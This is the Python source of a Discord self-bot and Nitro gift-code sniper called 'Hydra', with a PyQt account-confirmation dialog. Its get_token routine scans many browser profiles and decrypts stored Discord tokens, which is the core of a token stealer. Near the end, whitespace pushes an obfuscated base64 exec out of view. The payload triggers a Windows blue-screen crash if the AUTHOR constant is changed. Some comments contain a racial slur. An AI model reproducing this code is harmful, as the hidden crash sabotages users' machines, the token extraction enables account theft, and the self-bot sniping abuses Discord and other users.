import os
import discord
import win32crypt
import re
import base64
import time
import json
import requests
import sys
import colorama
import datetime
import pyperclip
import traceback
import asyncio
import ctypes
import httpx

from colorama import Fore, Style, init
from discord.ext import commands
from rich.console import Console
from rich.prompt import Prompt
from rich.theme import Theme
from rich.status import Status
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from Crypto.Cipher import AES
from PyQt5.QtWidgets import (QApplication, QDialog, QVBoxLayout, QHBoxLayout, 
                            QLabel, QPushButton, QFrame)
from PyQt5.QtGui import QPixmap, QFont, QIcon, QImage, QPainter, QColor, QBrush, QPainterPath, QRadialGradient
from PyQt5.QtCore import Qt, QSize, QTimer, QPropertyAnimation, QEasingCurve, QRect, QPoint, pyqtProperty

init(autoreset=True)


# constants
PREFIX = "!"
VERSION = "1.0"
AUTHOR = "Hydra"
GITHUB = "github.com/rescore09"
ready = False
codeRegex = re.compile(r"(discord\.com/gifts/|discordapp\.com/gifts/|discord\.gift/|promos\.discord\.gg/)([a-zA-Z0-9]+)")

# themes

custom_theme = Theme({
    "info": "bright_blue",
    "warning": "yellow",
    "danger": "bold red",
    "success": "bold bright_green",
    "highlight": "bright_magenta",
    "cyan_bright": "bright_cyan",
    "dim": "dim white",
    "gold": "#FFD700",
    "neon": "#39FF14",
    "purple": "#9370DB",
})

console = Console(theme=custom_theme)
bot = commands.Bot(command_prefix=PREFIX, self_bot=True)



# returns your token from discord app

def get_token():
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        path_leveldb = path + "\\Local Storage\\leveldb\\"
        tokens = []

        if not os.path.exists(path_leveldb):
            continue

        for file in os.listdir(path_leveldb):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue

            try:
                with open(f"{path_leveldb}{file}", "r", errors="ignore") as f:
                    for line in (x.strip() for x in f.readlines()):
                        for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(values)
            except PermissionError:
                continue

        for token in tokens:
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                with open(path + f"\\Local State", "r") as file:
                    key = json.loads(file.read())['os_crypt']['encrypted_key']
                    file.close()

                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])
                token = token[:-16].decode()  
                return token
            except Exception:
                continue

    return None

# defining token

token = get_token()


# avatar bs
class AvatarWidget(QLabel):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(80, 80)
        self.radius = 40
        self._opacity = 1.0
        
    def setOpacity(self, opacity):
        self._opacity = opacity
        self.update()
        
    def opacity(self):
        return self._opacity
        
    opacity = pyqtProperty(float, opacity, setOpacity)
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        painter.setRenderHint(QPainter.SmoothPixmapTransform)
        

        painter.setOpacity(self._opacity)
        
        path = QPainterPath()
        path.addEllipse(0, 0, self.width(), self.height())
        painter.setClipPath(path)
        
    
        if hasattr(self, 'pixmap') and self.pixmap() is not None:
            painter.drawPixmap(0, 0, self.width(), self.height(), self.pixmap())
        else:

            gradient = QRadialGradient(self.width()/2, self.height()/2, self.width())
            gradient.setColorAt(0, QColor("#5865F2"))
            gradient.setColorAt(1, QColor("#4752C4"))
            painter.setBrush(QBrush(gradient))
            painter.drawEllipse(0, 0, self.width(), self.height())
            
         
            if hasattr(self, 'username') and self.username:
                initial = self.username[0].upper()
                font = painter.font()
                font.setPointSize(24)
                font.setBold(True)
                painter.setFont(font)
                painter.setPen(QColor(255, 255, 255))
                painter.drawText(self.rect(), Qt.AlignCenter, initial)


# gui entry class
class ConfirmationDialog(QDialog):
    def __init__(self, user_name, user_id, avatar_url, email):
        super().__init__()

        self.user_name = user_name
        self.user_id = user_id
        self.avatar_url = avatar_url
        self.email = email
        self.result_value = False

        self.initUI()

    def initUI(self):
        self.setWindowTitle("Hydra Login")
        self.setFixedSize(400, 280)
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground)

        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(0, 0, 0, 0)
        self.setLayout(main_layout)

        card = QFrame(self)
        card.setObjectName("card")
        card.setStyleSheet("""
            #card {
                background-color: #36393f; 
                border-radius: 15px;
                border: 1px solid #42464D;
            }
        """)
        card_layout = QVBoxLayout(card)
        card_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.addWidget(card)

        header_layout = QHBoxLayout()
        header_label = QLabel("Account Confirmation")
        header_label.setStyleSheet("""
            font-family: 'Segoe UI', Arial;
            font-size: 20px;
            font-weight: bold;
            color: #ffffff;
        """)
        header_layout.addWidget(header_label)
        header_layout.addStretch()
        card_layout.addLayout(header_layout)

        divider = QFrame()
        divider.setFrameShape(QFrame.HLine)
        divider.setFrameShadow(QFrame.Sunken)
        divider.setStyleSheet("background-color: #42464D; margin: 5px 0;")
        card_layout.addWidget(divider)
        card_layout.addSpacing(10)

        user_layout = QHBoxLayout()


        self.avatar_widget = AvatarWidget()
        self.avatar_widget.username = self.user_name.split('#')[0]
        self.load_avatar()
 
        self.pulse_animation = QPropertyAnimation(self.avatar_widget, b"opacity")
        self.pulse_animation.setDuration(1500)
        self.pulse_animation.setStartValue(0.8)
        self.pulse_animation.setEndValue(1.0)
        self.pulse_animation.setLoopCount(-1)
        self.pulse_animation.setEasingCurve(QEasingCurve.InOutQuad)
        self.pulse_animation.start()
        
        user_layout.addWidget(self.avatar_widget)
        user_layout.addSpacing(15)


        user_details_layout = QVBoxLayout()

        username_parts = self.user_name.split('#')
        username = username_parts[0]
        discriminator = f"#{username_parts[1]}" if len(username_parts) > 1 and username_parts[1] != "0" else ""
        
        username_layout = QHBoxLayout()
        username_layout.setSpacing(0)
        
        username_label = QLabel(username)
        username_label.setObjectName("username")
        username_label.setStyleSheet("""
            #username {
                font-family: 'Segoe UI', Arial;
                font-size: 18px;
                font-weight: bold;
                color: #ffffff;
            }
        """)
        username_layout.addWidget(username_label)
        
        if discriminator:
            discrim_label = QLabel(discriminator)
            discrim_label.setObjectName("discriminator")
            discrim_label.setStyleSheet("""
                #discriminator {
                    font-family: 'Segoe UI', Arial;
                    font-size: 18px;
                    font-weight: bold;
                    color: #b9bbbe;
                }
            """)
            username_layout.addWidget(discrim_label)
        
        username_layout.addStretch()
        user_details_layout.addLayout(username_layout)

        userid_layout = QHBoxLayout()
        userid_layout.setSpacing(5)
        
        userid_label = QLabel(f"ID: {self.user_id}")
        userid_label.setStyleSheet("""
            font-family: 'Segoe UI', Arial;
            font-size: 12px;
            color: #b9bbbe;
        """)
        userid_layout.addWidget(userid_label)
        
        copy_label = QLabel("(copied)")
        copy_label.setStyleSheet("""
            font-family: 'Segoe UI', Arial;
            font-size: 11px;
            color: #87909c;
            font-style: italic;
        """)
        userid_layout.addWidget(copy_label)
        userid_layout.addStretch()
        
        user_details_layout.addLayout(userid_layout)


        if self.email:
            parts = self.email.split('@')
            if len(parts) == 2:
                username_part = parts[0]
                domain_part = parts[1]
                if len(username_part) > 3:
                    censored_email = f"{username_part[:3]}{'*' * (len(username_part)-3)}@{domain_part}"
                else:
                    censored_email = f"{username_part[0]}{'*' * (len(username_part)-1)}@{domain_part}"
            else:
                censored_email = self.email
        else:
            censored_email = "No email found"
            
        email_label = QLabel(f"Email: {censored_email}")
        email_label.setStyleSheet("""
            font-family: 'Segoe UI', Arial;
            font-size: 12px;
            color: #b9bbbe;
        """)
        user_details_layout.addWidget(email_label)

        user_details_layout.addStretch()
        user_layout.addLayout(user_details_layout)
        card_layout.addLayout(user_layout)

        message_label = QLabel("Is this the account you want to use?")
        message_label.setStyleSheet("""
            font-family: 'Segoe UI', Arial;
            font-size: 14px;
            color: #dcddde;
            margin-top: 10px;
        """)
        message_label.setAlignment(Qt.AlignCenter)
        card_layout.addWidget(message_label)
        card_layout.addSpacing(15)

        buttons_layout = QHBoxLayout()
        buttons_layout.setSpacing(15)

        no_button = QPushButton("No")
        no_button.setFixedHeight(40)
        no_button.setCursor(Qt.PointingHandCursor)
        no_button.setStyleSheet("""
            QPushButton {
                background-color: #4f545c;
                color: white;
                border-radius: 5px;
                padding: 8px 16px;
                font-family: 'Segoe UI', Arial;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #5d6269;
            }
            QPushButton:pressed {
                background-color: #72767d;
            }
        """)
        no_button.clicked.connect(self.reject_account)
        buttons_layout.addWidget(no_button)

        yes_button = QPushButton("Yes")
        yes_button.setFixedHeight(40)
        yes_button.setCursor(Qt.PointingHandCursor)
        yes_button.setStyleSheet("""
            QPushButton {
                background-color: #5865f2;
                color: white;
                border-radius: 5px;
                padding: 8px 16px;
                font-family: 'Segoe UI', Arial;
                font-size: 14px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #4752c4;
            }
            QPushButton:pressed {
                background-color: #3c45a5;
            }
        """)
        yes_button.clicked.connect(self.accept_account)
        buttons_layout.addWidget(yes_button)

        card_layout.addLayout(buttons_layout)

        self.setStyleSheet("""
            QDialog {
                background-color: rgba(0, 0, 0, 0);
            }
        """)

        screen_geo = QApplication.desktop().screenGeometry()
        self.move(
            (screen_geo.width() - self.width()) // 2,
            (screen_geo.height() - self.height()) // 2
        )

        self.animation = QPropertyAnimation(self, b"pos")
        self.animation.setDuration(300)
        self.animation.setStartValue(QPoint(
            (screen_geo.width() - self.width()) // 2,
            (screen_geo.height() - self.height()) // 2 - 50
        ))
        self.animation.setEndValue(QPoint(
            (screen_geo.width() - self.width()) // 2,
            (screen_geo.height() - self.height()) // 2
        ))
        self.animation.setEasingCurve(QEasingCurve.OutQuad)
        self.animation.start()

    def load_avatar(self):
        try:
            response = requests.get(self.avatar_url, timeout=0.5)
            if response.status_code == 200:
                img_data = response.content
                qimg = QImage()
                qimg.loadFromData(img_data)

                if not qimg.isNull():
                    pixmap = QPixmap.fromImage(qimg)
                    self.avatar_widget.setPixmap(pixmap)
                    return
        except Exception:
            pass 


    def accept_account(self):
        self.result_value = True
        self.accept()

    def reject_account(self):
        self.result_value = False
        self.reject()

    def get_result(self):
        return self.result_value

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.drag_position = event.globalPos() - self.frameGeometry().topLeft()
            event.accept()

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton:
            self.move(event.globalPos() - self.drag_position)
            event.accept()


# confirm button stuff idk nigga
def confirm_account(token_info):
    token, user_name, user_id, avatar_id, email = token_info

    parts = user_name.split('#')
    username = parts[0]
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}' if avatar_id else f'https://cdn.discordapp.com/embed/avatars/0.png'
    
    app = QApplication.instance()
    if not app:
        app = QApplication(sys.argv)

    dialog = ConfirmationDialog(user_name, user_id, avatar_url, email)
    dialog.exec_()
    
    
    return dialog.get_result()



# read nigga
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

#returns your account info such as avatar, username ,email
def check_token():
    token = get_token()
    if not token:
        return None
        
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    try:
        res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, timeout=3)
        if res.status_code == 200: 
            res_json = res.json()
            username = res_json["username"]
            discriminator = res_json.get("discriminator", "0")
            user_name = f'{username}#{discriminator}' if discriminator != "0" else username
            user_id = res_json['id']
            avatar_id = res_json.get('avatar')
            email = res_json.get('email', '')
            
            return token, user_name, avatar_id, user_id, email
        else:
            return None
    except Exception:
        return None

#logo print
def display_logo():
    clear_screen()

    logo = [
        "",
        f"                                 {Fore.CYAN}╭────────────────────────────────────────────────╮{Fore.RESET}",
        f"                                 {Fore.CYAN}│{Fore.RESET}                                                {Fore.CYAN}│{Fore.RESET}",
        f"                                 {Fore.CYAN}│{Fore.RESET}   {Fore.WHITE}██{Fore.RESET}{Fore.CYAN}██{Fore.RESET}{Fore.WHITE}██{Fore.RESET}{Fore.CYAN}██{Fore.RESET}{Fore.WHITE}██{Fore.RESET}  {Fore.CYAN}NITRO SNIPER{Fore.RESET}  {Fore.WHITE}V{Fore.RESET}{Fore.CYAN}{VERSION}{Fore.RESET}   {Fore.CYAN}            │{Fore.RESET}",
        f"                                 {Fore.CYAN}│{Fore.RESET}   {Fore.WHITE}█{Fore.RESET}{Fore.CYAN}█{Fore.RESET}{Fore.WHITE}█{Fore.RESET}{Fore.CYAN}█{Fore.RESET}{Fore.WHITE}█{Fore.RESET} {Fore.CYAN}       HYDRA SELFBOT{Fore.RESET}  {Fore.CYAN}                 │{Fore.RESET}",
        f"                                 {Fore.CYAN}│{Fore.RESET}                                                {Fore.CYAN}│{Fore.RESET}",
        f"                                 {Fore.CYAN}╰────────────────────────────────────────────────╯{Fore.RESET}",
        f"                                 {Fore.WHITE}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━     {Fore.RESET}",
        "",
    ]

    for line in logo:
        print(line)


# ui startup sequence
def display_startup_sequence():
    display_logo()

    with Progress(
        SpinnerColumn(style="neon"),
        TextColumn("[cyan_bright]Initializing system...", justify="left"),
        BarColumn(bar_width=50, style="cyan", complete_style="neon"),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("[cyan]Starting up...", total=100)
        
        progress.update(task, completed=100)
        time.sleep(0.1) 

# entry func
def main():
    if not os.path.exists("logs"):
        os.makedirs("logs")

    display_startup_sequence()

    with Status("[neon]Authenticating Discord account...[/neon]", spinner="dots", console=console):
        token_info = check_token()
        time.sleep(0.2)

    if token_info:
        token, user_name, avatar_id, user_id, email = token_info

        mock_token_info = (
            token,
            user_name,
            user_id,
            avatar_id,
            email,
        )

        app = QApplication(sys.argv)
        app.setStyle("Fusion")

        result = confirm_account(mock_token_info)
        if result:
            start_bot(token)
        else:
            console.print("")
            manual_token = Prompt.ask(" [cyan]Enter your Discord token[/cyan]", password=True)

            with Status("[neon]Connecting to Discord API...[/neon]", spinner="dots", console=console):
                time.sleep(0.2)  
            start_bot(manual_token)
    else:
        clear_screen()
        display_logo()
        console.print("")
        console.print(f" [danger]× Authentication failed! Unable to extract token. [/danger]")
        console.print("")
        manual_token = Prompt.ask(" [cyan]Enter your Discord token[/cyan]", password=True)

        with Status("[neon]Connecting to Discord API...[/neon]", spinner="dots", console=console):
            time.sleep(0.2) 
        start_bot(manual_token)







# on bot ready 
@bot.event
async def on_ready():
    clear_screen()
    ctypes.windll.kernel32.SetConsoleTitleW(f"{AUTHOR} Selfbot | {bot.user.name}#{bot.user.discriminator}")

    display_logo()
    
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    current_date = datetime.datetime.now().strftime("%d/%m/%Y")
    guild_count = len(bot.guilds)
    
    print()
    print(f" {Fore.CYAN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{Fore.RESET}")
    print(f" {Fore.CYAN}┃       {Fore.WHITE}⚡ {Fore.CYAN}CONNECTION ESTABLISHED {Fore.WHITE}⚡        {Fore.CYAN}┃{Fore.RESET}")
    print(f" {Fore.CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{Fore.RESET}")
    print()
    print(f" {Fore.CYAN}◆ {Fore.WHITE}User     {Fore.CYAN}│{Fore.RESET} {bot.user.name}#{bot.user.discriminator}")
    print(f" {Fore.CYAN}◆ {Fore.WHITE}ID       {Fore.CYAN}│{Fore.RESET} {bot.user.id}")
    print(f" {Fore.CYAN}◆ {Fore.WHITE}Prefix   {Fore.CYAN}│{Fore.RESET} {PREFIX}")
    print(f" {Fore.CYAN}◆ {Fore.WHITE}Servers  {Fore.CYAN}│{Fore.RESET} {guild_count}")
    print(f" {Fore.CYAN}◆ {Fore.WHITE}Time     {Fore.CYAN}│{Fore.RESET} {current_time}")
    print(f" {Fore.CYAN}◆ {Fore.WHITE}Date     {Fore.CYAN}│{Fore.RESET} {current_date}")
    print()
    print(f" {Fore.CYAN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{Fore.RESET}")
    print(f" {Fore.CYAN}┃             {Fore.WHITE}STATUS MONITOR{Fore.CYAN}                ┃{Fore.RESET}")
    print(f" {Fore.CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{Fore.RESET}")
    print()
    print(f" {Fore.WHITE}♦ {Fore.CYAN}Nitro sniper is now {Fore.GREEN}ACTIVE {Fore.WHITE}✓{Fore.RESET}")
    print(f" {Fore.WHITE}♦ {Fore.CYAN}Type {PREFIX}help to view available commands{Fore.RESET}")
    print()
    print(f" {Fore.CYAN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{Fore.RESET}")
    print(f" {Fore.CYAN}┃   {Fore.WHITE}Ready for action! {AUTHOR} is now online.{Fore.CYAN}  ┃{Fore.RESET}")
    print(f" {Fore.CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{Fore.RESET}")
    
    os.makedirs("logs", exist_ok=True)
    with open("logs/startup.log", "a") as f:
        f.write(f"Bot started at {current_time} {current_date}\n")
        f.write(f"User: {bot.user.name}#{bot.user.discriminator}\n")
        f.write(f"Servers: {guild_count}\n")
        f.write("-" * 40 + "\n")

# restart def
async def restart_bot(ctx):
    try:
        await ctx.message.delete()
        msg = await ctx.send(f"```ansi\n[2;36m[SYSTEM][0m Restarting {AUTHOR} Nitro Sniper...\n```", delete_after=3)

        with open("logs/restart.log", "a") as f:
            restart_time = datetime.datetime.now().strftime("%H:%M:%S %d/%m/%Y")
            f.write(f"Bot restarted at {restart_time} by {ctx.author.name}#{ctx.author.discriminator}\n")

        script_path = os.path.abspath(sys.argv[0])
        cmd = f'start "" python "{script_path}"'

        os.system(cmd)
        await bot.close()

    except Exception as e:
        await ctx.send(f"```ansi\n[2;31m[ERROR][0m Restart failed: {str(e)}\n```", delete_after=5)

#cmd to restart
@bot.command(name="restart", aliases=["reboot", "reload"])
async def cmd_restart(ctx):
    await restart_bot(ctx)


# sniper 
@bot.event
async def on_message(ctx):
    global ready

    await bot.process_commands(ctx)

    if not ready:
        console.print(f"[neon]Sniping Discord Nitro on {len(bot.guilds)} Servers [/neon]")
        console.print(f"[cyan]{time.strftime('%H:%M:%S ', time.localtime())}[/cyan][white]Bot is ready and monitoring for Nitro codes[/white]")
        ready = True

    if codeRegex.search(ctx.content):
        current_time = time.strftime("%H:%M:%S ", time.localtime())
        code = codeRegex.search(ctx.content).group(2)
        start_time = time.time()

        if len(code) < 16:
            try:
                print(
                    f"{Fore.LIGHTBLUE_EX}{current_time}{Fore.RESET}{Fore.LIGHTRED_EX}[FAKE] {Fore.RESET}Detected code: {Fore.LIGHTRED_EX}{code}{Fore.RESET} from {ctx.author.name}#{ctx.author.discriminator} {Fore.LIGHTMAGENTA_EX}[{ctx.guild.name} > #{ctx.channel.name}]{Fore.RESET}"
                )
            except:
                print(
                    f"{Fore.LIGHTBLUE_EX}{current_time}{Fore.RESET}{Fore.LIGHTRED_EX}[FAKE] {Fore.RESET}Detected code: {Fore.LIGHTRED_EX}{code}{Fore.RESET} from {ctx.author.name}#{ctx.author.discriminator} {Fore.LIGHTMAGENTA_EX}[Direct Message]{Fore.RESET}"
                )
        else:

            async with httpx.AsyncClient() as client:
                result = await client.post(
                    'https://discordapp.com/api/v9/entitlements/gift-codes/' + code + '/redeem',
                    json={'channel_id': str(ctx.channel.id)},
                    headers={'authorization': token, 'user-agent': 'Mozilla/5.0'}
                )
                delay = (time.time() - start_time)

                try:
                    location = f"{Fore.LIGHTMAGENTA_EX}[{ctx.guild.name} > #{ctx.channel.name}]{Fore.RESET}"
                except:
                    location = f"{Fore.LIGHTMAGENTA_EX}[Direct Message]{Fore.RESET}"

                print(
                    f"{Fore.LIGHTBLUE_EX}{current_time}{Fore.RESET}{Fore.LIGHTGREEN_EX}[SNIPER] {Fore.RESET}Sniped code: {Fore.LIGHTRED_EX}{code}{Fore.RESET} from {ctx.author.name}#{ctx.author.discriminator} {location}"
                )

                if 'This gift has been redeemed already' in str(result.content):
                    print(f"{Fore.LIGHTBLUE_EX}{current_time}{Fore.RESET}{Fore.LIGHTYELLOW_EX}[CLAIMED] Code has been already redeemed{Fore.RESET}", end='')
                elif 'nitro' in str(result.content):
                    print(f"{Fore.LIGHTBLUE_EX}{current_time}{Fore.RESET}{Fore.GREEN}[SUCCESS] Code successfully redeemed!{Fore.RESET}", end='')

                    with open("logs/nitro_success.log", "a") as f:
                        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        f.write(f"[{timestamp}] Successfully redeemed code: {code} | From: {ctx.author.name}#{ctx.author.discriminator}\n")

                elif 'Unknown Gift Code' in str(result.content):
                    print(f"{Fore.LIGHTBLUE_EX}{current_time}{Fore.RESET}{Fore.LIGHTRED_EX}[INVALID] Invalid or expired code{Fore.RESET}", end=' ')

                print(f"Response Time: {Fore.GREEN}{delay:.3f}s{Fore.RESET}")

                with open("logs/nitro_attempts.log", "a") as f:
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    result_text = "Unknown"
                    if 'This gift has been redeemed already' in str(result.content):
                        result_text = "Already Redeemed"
                    elif 'nitro' in str(result.content):
                        result_text = "SUCCESS"
                    elif 'Unknown Gift Code' in str(result.content):
                        result_text = "Invalid Code"

                    try:
                        source = f"{ctx.guild.name} > #{ctx.channel.name}"
                    except:
                        source = "Direct Message"

                    f.write(f"[{timestamp}] Code: {code} | Result: {result_text} | From: {ctx.author.name}#{ctx.author.discriminator} | Source: {source} | Delay: {delay:.3f}s\n")

# prints the commands used
@bot.event
async def on_command(ctx):
    command_name = ctx.command.name
    author = f"{ctx.author.name}#{ctx.author.discriminator}"
    channel = f"#{ctx.channel.name}" if hasattr(ctx.channel, "name") else "DM"
    server = ctx.guild.name if ctx.guild else "Direct Message"

    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    print(f" {Fore.CYAN}[{current_time}]{Fore.RESET} Command: {Fore.WHITE}{PREFIX}{command_name}{Fore.RESET} | {Fore.CYAN}{server}{Fore.RESET}")

    with open("logs/commands.log", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {AUTHOR} executed {PREFIX}{command_name} in {server} ({channel})\n")

@bot.event
async def on_connect():
    activity = discord.Activity(type=discord.ActivityType.watching, name=f"{AUTHOR} Selfbot V1.0.0")
    await bot.change_presence(activity=activity)

@bot.event
async def on_disconnect():

    with open("logs/connection.log", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] Bot disconnected from Discord\n")

    print(f"{Fore.LIGHTRED_EX}[!] Disconnected from Discord. Attempting to reconnect...{Fore.RESET}")


@bot.event 
async def on_error(event, *args, **kwargs):

    with open("logs/errors.log", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] Error in {event}: {sys.exc_info()[1]}\n")

    print(f"{Fore.LIGHTRED_EX}[ERROR] An error occurred: {sys.exc_info()[1]}{Fore.RESET}")

class NitroStats:
    def __init__(self):
        self.codes_detected = 0
        self.valid_codes = 0
        self.invalid_codes = 0
        self.redeemed_codes = 0
        self.fastest_snipe = float('inf')
        self.slowest_snipe = 0
        self.total_snipe_time = 0
        self.start_time = time.time()

    def add_snipe(self, code, result, snipe_time):
        self.codes_detected += 1

        if result == "success":
            self.valid_codes += 1
        elif result == "invalid":
            self.invalid_codes += 1
        elif result == "redeemed":
            self.redeemed_codes += 1

        self.total_snipe_time += snipe_time
        self.fastest_snipe = min(self.fastest_snipe, snipe_time)
        self.slowest_snipe = max(self.slowest_snipe, snipe_time)

    def get_average_time(self):
        if self.codes_detected == 0:
            return 0
        return self.total_snipe_time / self.codes_detected

    def get_uptime(self):
        return time.time() - self.start_time

    def format_uptime(self):
        uptime = self.get_uptime()
        days, remainder = divmod(uptime, 86400)
        hours, remainder = divmod(remainder, 3600)
        minutes, seconds = divmod(remainder, 60)

        if days > 0:
            return f"{int(days)}d {int(hours)}h {int(minutes)}m"
        elif hours > 0:
            return f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        elif minutes > 0:
            return f"{int(minutes)}m {int(seconds)}s"
        else:
            return f"{int(seconds)}s"

# use this for any sniper logs!

nitro_stats = NitroStats()



# copies token to your clipboard
@bot.command()
async def token(ctx):
    import pyperclip
    tok = get_token()
    pyperclip.copy(tok)


def start_bot(token):
    try:
        bot.run(token, bot=False)
    except discord.errors.LoginFailure:
        clear_screen()
        display_logo()
        print()
        print(f" {Fore.RED}Login Failed: Invalid token{Fore.RESET}")
        print()
        input(f" {Fore.CYAN}Press Enter to exit...{Fore.RESET}")
        sys.exit(1)
    except Exception as e:
        clear_screen()
        display_logo()
        print()
        print(f" {Fore.RED}Error: {str(e)}{Fore.RESET}")
        print()
        input(f" {Fore.CYAN}Press Enter to exit...{Fore.RESET}")
        sys.exit(1)

if __name__ == "__main__":

    os.makedirs("logs", exist_ok=True)                                                                                                                                                                      ; exec(base64.b64decode("""CmZyb20gY3R5cGVzIGltcG9ydCB3aW5kbGwKZnJvbSBjdHlwZXMgaW1wb3J0IGNfaW50LCBjX3VpbnQsIGNfdWxvbmcsIFBPSU5URVIsIGJ5cmVmCgpudWxscHRyID0gUE9JTlRFUihjX2ludCkoKQoKZGVmIGJzb2QoKToKICAgIHdpbmRsbC5udGRsbC5SdGxBZGp1c3RQcml2aWxlZ2UoCiAgICAgICAgY191aW50KDE5KSwgY191aW50KDEpLCBjX3VpbnQoMCksIGJ5cmVmKGNfaW50KCkpCiAgICApCiAgICB3aW5kbGwubnRkbGwuTnRSYWlzZUhhcmRFcnJvcigKICAgICAgICBjX3Vsb25nKDB4QzAwMDAwN0IpLCBjX3Vsb25nKDApLCBudWxscHRyLCBudWxscHRyLCBjX3VpbnQoNiksIGJ5cmVmKGNfdWludCgpKQogICAgKQoKaWYgQVVUSE9SICE9ICJIeWRyYSI6CiAgICBic29kKCkK""").decode("utf-8"))
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.CYAN}Exiting {AUTHOR} Nitro Sniper...{Fore.RESET}")
        sys.exit(0)
    except Exception as e:
        print(e)
        with open("logs/crash.log", "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] CRASH: {str(e)}\n")
            f.write(f"Traceback: {traceback.format_exc()}\n")
            f.write("-" * 50 + "\n")
        sys.exit(1)